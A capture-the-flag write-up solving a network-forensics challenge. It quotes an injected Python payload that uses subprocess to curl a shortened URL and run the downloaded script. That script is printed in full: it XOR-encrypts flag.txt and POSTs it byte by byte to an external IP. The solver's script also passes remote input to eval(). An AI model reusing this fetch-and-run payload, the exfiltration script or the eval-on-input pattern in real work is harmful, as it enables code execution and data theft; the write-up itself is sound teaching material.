# Chall description
I was trying a beginner CTF challenge and successfully solved it. But it didn't give me the flag. Luckily I have this network capture. Can you investigate?
nc chals.sekai.team 9000
included: capture.pcapng

# Write up

Connecting to the nc returns: 
```
Welcome to this intro pwntools challenge.
I will send you calculations and you will send me the answer
Do it 100 times within time limit and you get the flag :)

7 / 5
```

run it through python eval and check each input:
```
#!/bin/python

from pwn import *

io = remote('chals.sekai.team', 9000)
for i in range(4):
    print(io.recvline())

for z in range(100):
    cal = io.recvline()
    print(cal)
    eva_cal = str(eval(cal))
    print(eva_cal)
    io.sendline(eva_cal)
    print(io.recvline())

print(io.recvline())
```

71st question returns:
```
b'__import__("subprocess").check_output("(curl -sL https://shorturl.at/fgjvU -o extract.sh && chmod +x extract.sh && bash extract.sh && rm -f extract.sh)>/dev/null 2>&1||true",shell=True)\r#1 + 2 
```

Download the sh script and check it:
```
#!/bin/bash

FLAG=$(cat flag.txt)

KEY='s3k@1_v3ry_w0w'


# Credit: https://gist.github.com/kaloprominat/8b30cda1c163038e587cee3106547a46
Asc() { printf '%d' "'$1"; }


XOREncrypt(){
    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    for (( ptr=0; ptr < ${#DataIn}; ptr++ )); do

        val1=$( Asc "${DataIn:$ptr:1}" )
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        DataOut+=$(printf '%02x' "$val3")

    done

    for ((i=0;i<${#DataOut};i+=2)); do
    BYTE=${DataOut:$i:2}
    curl -m 0.5 -X POST -H "Content-Type: application/json" -d "{\"data\":\"$BYTE\"}" http://35.196.65.151:30899/ &>/dev/null
    done
}

XOREncrypt $KEY $FLAG

exit 0
```

Encrypted (XORd) data is posted to 35.196.65.151:30899, since we have the pcap we can recover the posted data:
```
$ tshark -r capture.pcapng -Y 'ip.src==172.26.184.35 and http.request.method=="POST"' -T fields -e json.value.string > capture.txt
```

We can then use the github sh script to re-use the decrypt function:

```
#!/bin/bash

# requirements:
#
# md5
# cut
# tr
# base64
#

Asc() { printf '%d' "'$1"; }
HexToDec() { printf '%d' "0x$1"; }

XORDecrypt() {

    local key="$1" DataIn="$2"
    local ptr DataOut val1 val2 val3

    local ptrs
    ptrs=0

    for (( ptr=0; ptr < ${#DataIn}/2; ptr++ )); do

        val1="$( HexToDec "${DataIn:$ptrs:2}" )"
        val2=$( Asc "${key:$(( ptr % ${#key} )):1}" )

        val3=$(( val1 ^ val2 ))

        ptrs=$((ptrs+2))

        DataOut+=$( printf \\$(printf "%o" "$val3") )

    done
    printf '%s' "$DataOut"
}

Operation="$1"

CodeKey="s3k@1_v3ry_w0w"

read -r teststring

#XORDecrypt "$CodeKey" "$teststring" | base64 -d
XORDecrypt "$CodeKey" "$teststring" 
```

use tr to delete the \\n's and run the script with the capture
```
$ tr --delete '\n' < capture.txt| ./rev.sh dec

Flag:
SEKAI{3v4l_g0_8rrrr_8rrrrrrr_8rrrrrrrrrrr_!!!_8483}
```